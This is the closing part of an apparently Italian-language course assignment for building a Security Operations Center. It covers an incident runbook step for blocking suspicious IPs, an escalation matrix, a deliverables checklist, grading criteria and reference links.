**Steps**:
1. Verify alert in dashboard (check source IP, target host, attempt count)
2. Check if IP is internal (potential compromised host) or external
3. If external:
   - Block IP at firewall: `ufw deny from <IP>`
   - Add to blacklist in IDS config
4. If internal:
   - Investigate host for compromise
   - Check for malware
   - Isolate if necessary
5. Document in incident management system
6. Update alert status to "resolved"

**Expected Resolution Time**: 15 minutes

### Malware Detection (Priority: Critical)
[...]

### Performance Anomaly (Priority: Medium)
[...]

## Escalation Matrix
| Severity | Escalate To | SLA |
|----------|-------------|-----|
| Critical | SOC Manager | 5 min |
| High | Senior Analyst | 15 min |
| Medium | Team Lead | 30 min |
| Low | Next business day | 24 hours |
```

---

## Submission Requirements

### Deliverables Checklist
- [ ] Multi-host Docker Compose deployment (running)
- [ ] Dashboard implementation (Flask app + HTML templates)
- [ ] Attack simulation scripts (all 5 stages)
- [ ] Investigation report (from Task 2.2)
- [ ] Impact assessment (severity score)
- [ ] Containment script implementation
- [ ] Eradication checklist (completed)
- [ ] Recovery validation report
- [ ] Post-mortem document (complete)
- [ ] Updated detection rules
- [ ] Executive presentation (PDF, 10 slides)
- [ ] Demo video (5 minutes)
- [ ] Technical documentation (4 guides)
- [ ] Final Q&A responses in `risposte_esercizio5.md`

### Evaluation Criteria

| Category | Weight | Points |
|----------|--------|--------|
| **Infrastructure Setup** | 15% | |
| - Multi-host deployment | 7% | |
| - Dashboard implementation | 8% | |
| **Incident Simulation & Detection** | 25% | |
| - Attack simulation completeness | 10% | |
| - Detection effectiveness | 10% | |
| - Timeline reconstruction | 5% | |
| **Investigation & Analysis** | 20% | |
| - Alert correlation | 8% | |
| - Vector search usage | 7% | |
| - Impact assessment | 5% | |
| **Response & Remediation** | 20% | |
| - Containment implementation | 10% | |
| - Eradication procedures | 10% | |
| **Documentation & Presentation** | 20% | |
| - Post-mortem quality | 8% | |
| - Executive presentation | 7% | |
| - Technical docs | 5% | |
| **Bonus Points** | +10% | |
| - Automated response | +4% | |
| - Additional ML improvements | +3% | |
| - Creative enhancements | +3% | |

### Grading Scale
- **90-100%**: Excellent - Production-ready SOC implementation
- **80-89%**: Good - Solid understanding, minor improvements needed
- **70-79%**: Satisfactory - Basic requirements met
- **<70%**: Needs improvement - Significant gaps

---

## Tips for Success

💡 **Start Early**: Questo progetto richiede 8-10 ore distribuite su 2 settimane

💡 **Test Incrementally**: Non aspettare la fine per testare. Valida ogni componente separatamente.

💡 **Document As You Go**: Non lasciare tutta la documentazione alla fine

💡 **Use Real Tools**: Dove possibile, usa tool reali (Snort, OSSEC, etc.) per esperienza pratica

💡 **Think Like Attacker**: Per detection efficace, devi capire tecniche attacco

💡 **Metrics Matter**: Trackka MTTD, MTTR per dimostrare efficacia SOC

---

## References

- [NIST Incident Response Guide (SP 800-61)](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)
- [SANS Incident Handler's Handbook](https://www.sans.org/white-papers/33901/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [CIS Controls](https://www.cisecurity.org/controls)
- [PCI DSS Incident Response](https://www.pcisecuritystandards.org/)

---

**Congratulazioni per aver completato il percorso! 🎓🔐**

Hai costruito un Security Operations Center completo con:
✅ Multi-agent monitoring system
✅ ML-powered threat detection
✅ Vector search per incident investigation
✅ Automated response capabilities
✅ Complete incident response workflow

**Questo è un progetto portfolio-ready che puoi mostrare nei colloqui!**
